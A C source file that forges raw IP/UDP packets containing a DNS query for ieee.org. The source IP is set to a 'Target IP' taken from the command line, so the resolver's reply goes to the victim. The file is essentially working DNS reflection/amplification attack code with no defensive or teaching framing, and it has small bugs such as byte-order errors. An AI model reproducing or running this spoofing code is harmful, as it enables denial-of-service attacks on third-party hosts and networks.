#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

#define URL1 "www.google.com"
#define URL2 "www.amazon.com"
#define URL3 "ieee.org"
typedef struct iphdr iphdr;
typedef struct udphdr udphdr;

/* change url to specific form */
void dns_format(unsigned char *, unsigned char *);

/* calculate checksum */
unsigned short csum(unsigned short *, int);

/* DNS header struct */
typedef struct
{
	unsigned short id;
    unsigned char rd : 1;
    unsigned char tc : 1;
    unsigned char aa : 1;
    unsigned char opcode : 4;
    unsigned char qr : 1;
    unsigned char rcode : 4;
    unsigned char cd : 1;
    unsigned char ad : 1;
    unsigned char z : 1;
    unsigned char ra : 1;
	unsigned short qcount;
	unsigned short ans;
	unsigned short auth;
	unsigned short add;
}dnshdr;

/* Question types */
typedef struct
{
	unsigned short qtype;
	unsigned short qclass;
}query;

int main(int argc, char **argv){
    /* check all setting are done */
	if(getuid()!=0 || argc < 4){
        printf("sudo %s <Target IP> <TARGET PORT> <DNS IP>", argv[1]);
        return 0;
    }
    char *target_ip = argv[1], *dns_ip = argv[3];
    int target_port = atoi(argv[2]), dns_port = 53;
    
    /* create socket */
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dns_port);
    sin.sin_addr.s_addr = inet_addr(dns_ip);

    /* start fabricating headers */
    // whole packet
    unsigned char packet[4096];
    memset(packet, 0, 4096);
    iphdr *ip = (iphdr *)packet; // ip header struct
    udphdr *udp = (udphdr *)(packet + sizeof(iphdr)); // udp header struct
    unsigned char dns_data[128]; // dns data(header + content)
    // dns
    dnshdr *dns = (dnshdr *)&dns_data;
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0;
    dns->opcode = 0;
    dns->aa = 0;
    dns->tc = 0;
    dns->rd = 1;
    dns->ra = 0;
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->qcount = htons(1);
    dns->ans = 0;
    dns->auth = 0;
    dns->add = 0;

    unsigned char *dns_name, url[32];
    dns_name = (unsigned char *)&dns_data[sizeof(dnshdr)];
    strcpy(url, URL3);
    dns_format(dns_name, url);

    query *q = (query *)&dns_data[sizeof(dnshdr) + strlen(dns_name) + 1];
    q->qtype = htons(1);
    q->qclass = htons(1);

    char *data = packet + sizeof(iphdr) + sizeof(udphdr);
    memcpy(data, &dns_data, sizeof(dnshdr) + strlen(dns_name) + sizeof(query) + 1);
    // ip header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->protocol = IPPROTO_UDP;
    ip->ttl = 64;
    ip->saddr = inet_addr(target_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->tot_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query);
    ip->check = csum((unsigned short *)packet, ip->tot_len);
    // udp header
    udp->source = htons(target_port);
    udp->dest = htons(dns_port);
    udp->len = htons(ip->tot_len - sizeof(iphdr));
    udp->check = 0;

    /* send packet */
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd != -1) sendto(sd, packet, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    else printf("Could not create socket");
    close(sd);
    return 0;
}

void dns_format(unsigned char * dns,unsigned char * host) {
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

unsigned short csum(unsigned short *ptr,int nbytes){
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}
